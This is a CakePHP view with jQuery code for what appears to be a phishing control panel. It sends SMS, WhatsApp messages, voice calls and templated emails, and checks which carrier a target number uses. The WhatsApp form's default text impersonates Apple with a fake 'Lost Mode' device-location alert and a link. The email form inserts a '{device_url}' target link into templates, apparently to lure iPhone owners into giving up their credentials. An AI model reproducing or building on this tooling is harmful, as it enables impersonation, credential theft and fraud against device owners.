<style>
.select2-container{
	min-width: 376px !important;
}
</style>

<?php
	$input_group = array(
		array('phone_number', array('div'=>false,'type'=>'phone','required')),
		array('buttoname',array('type'=>'button','value'=>'Check Network!','class'=>'btn btn-outline-secondary check_network')),
	);
	
	$call_group = array(
		array('template',array('label' => 'Voice Template','required','type'=>'select','id'=>'voicemail_list'),$template_list),
		array('buttoname',array('type'=>'button','id'=>'play_voicemail','style'=>'width: 30px','value'=>'<i class="fa-solid fa-play"></i>','class'=>'btn btn-primary rounded-circle btn-sm btn-play-voicemail ms-2')),
	);
	
	echo $this->ModernizeComponent->create_card_container_start('<i class="fa-regular fa-mail fs-5"></i> &nbsp;Send SMS');
	echo $this->Form->create('Sms');
	echo  $this->ModernizeComponent->create_form_basic_input_batch(array(
		array(
			'size' => 12,
			'orientation' => 'horizontal',
			'contents' => array(
				array('phone_number', 12,array('type'=>'input_group'),$input_group),
				array('sms_api_id', 12,array('label' => 'Server','required','type'=>'select'),array()),
				array('sms_template_id', 12,array('label' => 'API','required','type'=>'select'),array()),
				array('sender_id', 12,array('type'=>'text','required')),
				array('message', 12,array('type'=>'textarea','required')),
			)
		),
		
	));
	
	echo $this->ModernizeComponent->create_form_action_start();
	echo $this->Form->button('<i class="fa-regular fa-circle-phone me-2 fs-4"></i> Send SMS',array('type'=>'submit','class'=>'btn btn-success font-medium rounded-pill px-5'));
	echo $this->ModernizeComponent->create_form_action_end();
	echo $this->Form->end();	
	echo $this->ModernizeComponent->create_card_container_end();

	//CALL
	echo $this->ModernizeComponent->create_card_container_start('<i class="fa-regular fa-circle-phone fs-5"></i> &nbsp;Voice Call');
	echo $this->Form->create('Call');
	echo  $this->ModernizeComponent->create_form_basic_input_batch(array(
		array(
			'size' => 12,
			'orientation' => 'horizontal',
			'contents' => array(
				array('server_id', 12,array('label' => 'Voice Server','required','type'=>'select'),$server_list),
				array('phone_number', 12,array('required','type'=>'input_group'),$input_group),
				array('template', 12,array('required','type'=>'input_group'),$call_group),
				'<audio id="voicemail_audio" preload="none"></audio>',
				'<audio id="voice_effect" preload="none"></audio>',
			)
		),
		
	));
	
	echo $this->ModernizeComponent->create_form_action_start();
	echo $this->Form->button('<i class="fa-regular fa-circle-phone me-2 fs-4"></i> Start Call',array('type'=>'submit','class'=>'btn btn-success font-medium rounded-pill px-5'));
	echo $this->ModernizeComponent->create_form_action_end();
	
	
	echo $this->Form->end();	
	echo $this->ModernizeComponent->create_card_container_end();
	
	
	
	//WHATSAPP
	echo $this->ModernizeComponent->create_card_container_start('<i class="fa-regular fa-mail fs-5"></i> &nbsp;Send Whatsapp');
	echo $this->Form->create('Whatsapp');
	echo  $this->ModernizeComponent->create_form_basic_input_batch(array(
		array(
			'size' => 12,
			'orientation' => 'horizontal',
			'contents' => array(
				array('phone_number', 12,array('type'=>'input_group'),$input_group),
				array('template', 12,array('label' => 'Template','required','type'=>'select'),$ios_device_list),
				array('message', 12,array('type'=>'textarea','required','value'=>"Dear Apple Customer,\r\n\r\nWe have detected here on our systems that there is a device in Lost Mode and it is associated with this number.\r\n\r\nA recent location of your device has been issued.\r\nhttps://\r\n\r\nCopyright © 2024 Apple Inc. All rights reserved.")),
			)
		),
		
	));
	
	echo $this->ModernizeComponent->create_form_action_start();
	echo $this->Form->button('<i class="fa-regular fa-circle-phone me-2 fs-4"></i> Send Message',array('type'=>'submit','class'=>'btn btn-success font-medium rounded-pill px-5'));
	echo $this->ModernizeComponent->create_form_action_end();
	echo $this->Form->end();	
	echo $this->ModernizeComponent->create_card_container_end();
	
	//EMAIL
	echo $this->ModernizeComponent->create_card_container_start('<i class="fa-regular fa-circle-phone fs-5"></i> &nbsp;Email Sender');
	echo $this->Form->create('Email');
	echo  $this->ModernizeComponent->create_form_basic_input_batch(array(
		array(
			'size' => 12,
			'orientation' => 'vertical',
			'contents' => array(
				array('email_api_id', 6,array('label' => 'Email Sender','required','type'=>'select'),$email_server_list),
				array('email_template_id', 6,array('label' => 'Email Template','required','type'=>'select'),$email_template_list),
				array('mail_to',6, array('type'=>'text','required')),
				array('subject',6, array('type'=>'text','required')),
				array('target_link',12, array('type'=>'text')),
				array('body',12, array('type'=>'textarea')),
			)
		),
		
	));
	
	echo $this->ModernizeComponent->create_form_action_start();
	echo $this->Form->button('<i class="fa-regular fa-circle-phone me-2 fs-4"></i> Send Email',array('type'=>'submit','class'=>'btn btn-success font-medium rounded-pill px-5'));
	echo $this->ModernizeComponent->create_form_action_end();
	
	
	echo $this->Form->end();	
	echo $this->ModernizeComponent->create_card_container_end();
	
	
	
	
	
	echo $this->ModernizeComponent->create_start_modal('myModal','Result');
	echo '<div class="container-fluid no-padding no-margin result_container" style="display: none">
				<div class="text-center loading">
					<span class="fa-stack fa-lg">
					<i class="fa fa-spinner fa-spin fa-stack-2x fa-fw"></i>
					</span>&nbsp;Processing ...
				</div>
		  </div>';
	echo '<div class="modal-footer">';
	echo $this->Form->button('Cancel', array('type' => 'button','data-bs-dismiss'=>'modal','class'=>'btn btn-light-danger text-danger font-medium waves-effect text-start'));
	echo '</div>';
	echo $this->ModernizeComponent->create_end_modal();
	
	
	
	
	
?>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
<script>
$(document).ready(function(){
    
    $("#CallAiPhoneNumber").on('input', function () {
    	this.value = this.value.replace(/\D/g, '');
    });
    
    $('#CallAiIndexForm').on('submit',function(e){
    	e.preventDefault();
    	$('.loading').prop('style','display: block');
    	$('.result_container').prop('style','display: none');
    	$("#myModal").modal('show');
    	$.ajax({
    	  type: "POST",
    	  url: "<?php echo Configure::read('BASE_URL') ?>tools/start_ai_call",
    	  data:  $(this).serialize(),
    	  dataType: "json",
    	  success: function(data){
    		 if(data.success == true){
    			  $('.result_container').prop('style','display: block');
    			  $('.loading').prop('style','display: none');
    			  swal.fire("Success", 'Call has been successfully placed!', "success").then(function () {
    				$('#myModal').modal('hide');
    			 });
    		  }else if (data.success == false){
    			  swal.fire("Error", data.msg, "error").then(function () {
    				$('#myModal').modal('hide');
    			  });
    		  }else{
    			 swal.fire("Error", 'An error occured, please contact system administrator.', "error").then(function () {
    				$('#myModal').modal('hide');
    			 });
    		  }
    	  },
    	  error: function(XMLHttpRequest, textStatus, errorThrown) {
    		 swal.fire("Error", 'An error occured, please contact system administrator.', "error").then(function () {
    			$('#myModal').modal('hide');
    		 });
    	  }
    	});	
    });
	
	 $('.check_network').on('click',function(e){
		 
		e.preventDefault();
		var country_code = $(this).closest('.row').find('.selected_country_code').val().trim();
		var number = $(this).closest('.row').find('.phone-input').val().trim();
		
		if(country_code.length <=0  || number.length <=0 ){
			swal.fire("Error", 'Country or phone number was not specified!', "error");
			return false;
		}
		
		var complete_number = country_code + number;
		showLoading();
		
		$.ajax({
		  type: "GET",
		  url: "<?php echo Configure::read('BASE_URL') ?>tools/check_phone_number/" + complete_number,
		  dataType: "json",
		  success: function(data){
			  if(typeof data.error != 'undefined'){
				swal.fire("Error", data.error, "error");
			  }else{
				 swal.fire({icon: 'success', html: '<div class="text-center"><h4> <p class="mb-1">Phone: ' + data.formattedPhoneNumber + '</p> <p class="mb-1">Country: ' + data.countryName + '</p> <p class="mb-1">Carrier: ' + data.originalCarrierName + '</p> <p class="mb-1">Timezone: ' + data.timeZone + '</p> </h4> </div>'});
			  }
		  },
		  error: function(XMLHttpRequest, textStatus, errorThrown) {
			 swal.fire("Error", 'An error occured, please contact system administrator.', "error");
		  }
		});
		 
	 });
		
	
	 
	 $("#CallPhoneNumber").on('input', function () {
        this.value = this.value.replace(/\D/g, '');
      });
	  
	  var call_update_interval = null;
	  $('#CallIndexForm').on('submit',function(e){
			e.preventDefault();
			clearInterval(call_update_interval);
			$('.loading').prop('style','display: block');
			$('.result_container').prop('style','display: none');
			$("#myModal").modal('show');
			$.ajax({
			  type: "POST",
			  url: "<?php echo Configure::read('BASE_URL') ?>tools/start_call",
			  data:  $(this).serialize(),
			  dataType: "json",
			  success: function(data){
				 if(data.success == true){
					  $('.result_container').prop('style','display: block');
					  $('.loading').prop('style','display: none');
					  call_update_interval = setInterval(() => update_call_status(data.sid), 1000);
				  }else if (data.success == false){
					  swal.fire("Error", data.msg, "error").then(function () {
						$('#myModal').modal('hide');
					  });
				  }else{
					 swal.fire("Error", 'An error occured, please contact system administrator.', "error").then(function () {
						$('#myModal').modal('hide');
					 });
				  }
			  },
			  error: function(XMLHttpRequest, textStatus, errorThrown) {
				 swal.fire("Error", 'An error occured, please contact system administrator.', "error").then(function () {
					$('#myModal').modal('hide');
				 });
			  }
			});	
	  });
	  
	  
		const voice_effect = $('#voice_effect');
		var is_ring = false;
		function ringEvent(){
			voice_effect.attr('src',"<?php echo Configure::read('BASE_URL') ?>files/audio/ring.mp3");
			voice_effect[0].currentTime=0;
			voice_effect[0].play();
		}

		function endRing(){
			is_ring = false;
			voice_effect[0].pause();
			voice_effect[0].currentTime=0;
		}

		$('#voice_effect').on('ended', function() {
			if(is_ring){
				repeatRing();
			}
		});

		async function repeatRing(){
			await sleep(2000);
			if(is_ring){
				voice_effect[0].currentTime=0;
				voice_effect[0].play();
			}
		}

		function sleep(n) {
			return new Promise(e => setTimeout(e, n))
		}
	  
	  
	  function update_call_status(sid){
		$.ajax({
		  type: "POST",
		  url: "<?php echo Configure::read('BASE_URL') ?>tools/get_realtime_call_status",
		  data:  "sid=" + sid,
		  dataType: "json",
		  success: function(data){
			 if(data.success == true){
				 
					var number = data.number;
					var call_status = data.call_status;
					var hstatus = call_status;
					
					var dial_error = data.dial_error;
					var response = data.response;
					
					var icon = "fa-thin fa-circle-phone fa-shake";	
					if(call_status=='initiated'){
						icon = "fa-thin fa-circle-phone fa-shake";
						hstatus = 'Calling';
					}else if(call_status=='ringing'){
						
						if(is_ring == false){
						    is_ring = true;
						    ringEvent();
						}
						
						icon = "fa-thin fa-circle-phone fa-shake";
						hstatus = 'Ringing';
					}else if(call_status=='in-progress'){
						endRing();
						icon = "text-navy fa-sharp fa-solid fa-phone-volume";
						hstatus = 'Answered';
					}else if(call_status=='busy'){
						endRing();
						icon = "text-danger fa-solid fa-phone-rotary";
						hstatus = 'Busy';
					}else if(call_status=='no-answer'){
						endRing();
						icon = "text-danger fa-solid fa-phone-rotary";
						hstatus = 'No Answer';
					}else if(call_status=='failed'){
						endRing();
						icon = "text-danger fa-solid fa-phone-rotary";
						hstatus = 'Call Failed';
					}else{
						endRing();
						icon = "text-danger fa-solid fa-phone-rotary";
					}
					
					$('.result_container').html('<div class="text-center"> <i class="' + icon + '" style="font-size:150px"></i> <br> <br> <h4> <p>Status: <span id="call_status">-</span></p> <p>Phone: <span id="dial_number">+-</span></p> <p>Response: <span id="dial_response">-</span></p> </h4> </div>');
					$('#call_status').html(hstatus);
					$('#dial_number').html(number);
					$('#dial_response').html(response);
					
					if(call_status=='busy' || call_status=='no-answer' || call_status=='failed' || call_status=='completed'){
						endRing();
						clearInterval(call_update_interval);
						
						if(call_status=='failed'){
							swal.fire("Call Failed!", dial_error , "error").then(function () {
								$('#myModal').modal('hide');
							});
						}else{
							swal.fire("Call has been successfully completed", 'Response: ' + response + ', Call Status: ' + hstatus , "success").then(function () {
								$('#myModal').modal('hide');
							});
						}
					}
					
			  }else if (data.success == false){
				  endRing();
				  clearInterval(call_update_interval);
				  swal.fire("Error", data.msg, "error").then(function () {
					$('#myModal').modal('hide');
				  });
			  }else{
				  endRing();
				  clearInterval(call_update_interval);
				  swal.fire("Error", 'An error occured, please contact system administrator.', "error").then(function () {
					$('#myModal').modal('hide');
				 });
			  }
		  },
		  error: function(XMLHttpRequest, textStatus, errorThrown) {
			  clearInterval(call_update_interval);
			  swal.fire("Error", 'An error occured, please contact system administrator.', "error").then(function () {
				$('#myModal').modal('hide');
			  });
		  }
		});	
	}
	
	$("#myModal").on('hide.bs.modal', function(){
		clearInterval(call_update_interval);
	});
	  
	  
	$("#EmailBody").summernote({
		height: 250, // set editor height
		minHeight: null, // set minimum height of editor
		maxHeight: null, // set maximum height of editor
		focus: false, // set focus to editable area after initializing summernote
	});
	
	$('.note-codable').on('blur', function() {
		if ($('#EmailBody').summernote('codeview.isActivated')) {
			$('#EmailBody').summernote('codeview.deactivate');
		}
	});  
	  
	  
	
	var selected_email_template = '';
	$('#EmailEmailTemplateId').on('change',function(){
		$.ajax({
			url: "<?php echo Configure::read('BASE_URL') ?>tools/get_email_template/" + $(this).val(),
			type: 'GET',
			success: function(res) {
				selected_email_template = res;
				var modified_email_template = selected_email_template.replaceAll("{device_url}", $('#EmailTargetLink').val());
				$('#EmailBody').summernote('reset');
				$('#EmailBody').summernote('pasteHTML', modified_email_template);
			}
		});
	});
	
	$('#EmailTargetLink').on('change',function(e){
		var modified_email_template = selected_email_template.replaceAll("{device_url}", $(this).val());
		$('#EmailBody').summernote('reset');
		$('#EmailBody').summernote('pasteHTML', modified_email_template);
	});
	
	
	$('#EmailIndexForm').on('submit',function(e){
		e.preventDefault();
		showLoading();
		
		$.ajax({
		  type: "POST",
		  url: "<?php echo Configure::read('BASE_URL') ?>tools/send_email",
		  data:  $(this).serialize(),
		  dataType: "json",
		  success: function(data){
			 if(data.success == true){
				  swal.fire("Success", data.msg, "success");
			  }else if (data.success == false){
				  swal.fire("Error", data.msg, "error");
			  }else{
				  swal.fire("Error", 'An error occured, please contact system administrator.', "error");
			  }
		  },
		  error: function(XMLHttpRequest, textStatus, errorThrown) {
			 swal.fire("Error", 'An error occured, please contact system administrator.', "error");
		  }
		});	
		
	});
	
	
	$('#SmsPhoneNumberSelectedCountryCode').on('change',function(){
		 var country_code = $(this).val();
		 $.ajax({
		  type: "GET",
		  url: "<?php echo Configure::read('BASE_URL') ?>tools/get_sms_country_servers/" + country_code,
		  dataType: "json",
		  success: function(data){
			  
			 $('#SmsSmsApiId').empty();
			 $('#SmsSmsApiId').append('<option value="">(Choose One)</option>');
			 
			 $.each(data, function(key, value) {
				$('#SmsSmsApiId').append('<option value="' + value.value + '" provider="' + value.provider + '">' + value.name + '</option>');
			 });
			 $('#SmsSmsApiId').trigger('change');
			 
		  },
		  error: function(XMLHttpRequest, textStatus, errorThrown) {
			 swal.fire("Error", 'An error occured, please contact system administrator.', "error");
		  }
		});
	});
	
	$('#SmsSmsApiId').on('change',function(){
		 var country_code = $('#SmsPhoneNumberSelectedCountryCode').val();
		 var provider_id = $(this).find('option:selected').attr('provider');
		
		 $.ajax({
		  type: "GET",
		  url: "<?php echo Configure::read('BASE_URL') ?>tools/get_sms_server_api/" + country_code + "/" + provider_id,
		  dataType: "json",
		  success: function(data){
			  
			 $('#SmsSmsTemplateId').empty();
			 $('#SmsSmsTemplateId').append('<option value="">(Choose One)</option>');
			 
			 $.each(data, function(key, value) {
				$('#SmsSmsTemplateId').append('<option value="' + key + '" >' + value + '</option>');
			 });
			 $('#SmsSmsTemplateId').trigger('change');
			 
		  },
		  error: function(XMLHttpRequest, textStatus, errorThrown) {
			 swal.fire("Error", 'An error occured, please contact system administrator.', "error");
		  }
		});
	});
	
	
	
	
	$('#SmsPhoneNumberSelectedCountryCode').trigger('change');
	
	$('#SmsSmsTemplateId').on('change',function(){
		var template_id = $(this).val();
		
		if(template_id !=='' || template_id !==null){
			$.ajax({
			  type: "GET",
			  url: "<?php echo Configure::read('BASE_URL') ?>tools/get_sms_template/" + template_id,
			  dataType: "json",
			  success: function(data){
				  if(data !== null ){
					  $('#SmsSenderId').val(data.sender_id);
					  $('#SmsMessage').val(data.template);
				  }
			  },
			  error: function(XMLHttpRequest, textStatus, errorThrown) {
				 swal.fire("Error", 'An error occured, please contact system administrator.', "error");
			  }
			});
		}
		
		 
	});
	
	
	
	
	$('#SmsIndexForm').on('submit',function(e){
		e.preventDefault();
		showLoading();
		
		$.ajax({
		  type: "POST",
		  url: "<?php echo Configure::read('BASE_URL') ?>tools/send_sms",
		  data:  $(this).serialize(),
		  dataType: "json",
		  success: function(data){
			 if(data.success == true){
				  swal.fire("Success", data.msg, "success");
			  }else if (data.success == false){
				  swal.fire("Error", data.msg, "error");
			  }else{
				  swal.fire("Error", 'An error occured, please contact system administrator.', "error");
			  }
		  },
		  error: function(XMLHttpRequest, textStatus, errorThrown) {
			 swal.fire("Error", 'An error occured, please contact system administrator.', "error");
		  }
		});	
		
	});
	
	$('#WhatsappIndexForm').on('submit',function(e){
		e.preventDefault();
		showLoading();
		
		$.ajax({
		  type: "POST",
		  url: "<?php echo Configure::read('BASE_URL') ?>tools/start_send_whatsapp",
		  data:  $(this).serialize(),
		  dataType: "json",
		  success: function(data){
			 if(data.success == true){
				  swal.fire("Success", data.msg, "success");
			  }else if (data.success == false){
				  swal.fire("Error", data.msg, "error");
			  }else{
				  swal.fire("Error", 'An error occured, please contact system administrator.', "error");
			  }
		  },
		  error: function(XMLHttpRequest, textStatus, errorThrown) {
			 swal.fire("Error", 'An error occured, please contact system administrator.', "error");
		  }
		});	
		
	});
	
	
	//============================
	$(document).on('click','.btn-play-voicemail',function(e){
		const voicemail_audio = $('#voicemail_audio');
		const path =  $("#voicemail_list option:selected").attr("path");
		
		if($("#voicemail_list option:selected").val()!==''){
			voicemail_audio.attr('src',path);
			voicemail_audio[0].currentTime=0;
			voicemail_audio[0].play();
		}else{
			swal.fire("",'Please select template from list.', "info");
		}
	});
	
	$(document).on('click','.btn-stop-voicemail',function(e){
		const voicemail_audio = $('#voicemail_audio');
		voicemail_audio[0].pause();
		
		var play_button = $('#play_voicemail');
		play_button.attr('class','btn btn-primary rounded-circle btn-sm btn-play-voicemail ms-2');
		play_button.find('i').attr('class','fa-solid fa-play');
	});
	
	$('#voicemail_audio').on('playing', function() {
		var play_button = $('#play_voicemail');
		play_button.attr('class','btn btn-warning rounded-circle btn-sm btn-stop-voicemail ms-2');
		play_button.find('i').attr('class','fas fa-pause');
	});
	
	$('#voicemail_audio').on('ended', function() {
		var play_button = $('#play_voicemail');
		play_button.attr('class','btn btn-primary rounded-circle btn-sm btn-play-voicemail ms-2');
		play_button.find('i').attr('class','fa-solid fa-play');
	});
	
	
	$(document).on('change','#voicemail_list',function(e){
		const voicemail_audio = $('#voicemail_audio');
		voicemail_audio[0].pause();
		
		var play_button = $('#play_voicemail');
		play_button.attr('class','btn btn-primary rounded-circle btn-sm btn-play-voicemail ms-2');
		play_button.find('i').attr('class','fa-solid fa-play');
	});
	
	
	
	
	
	  
});
</script>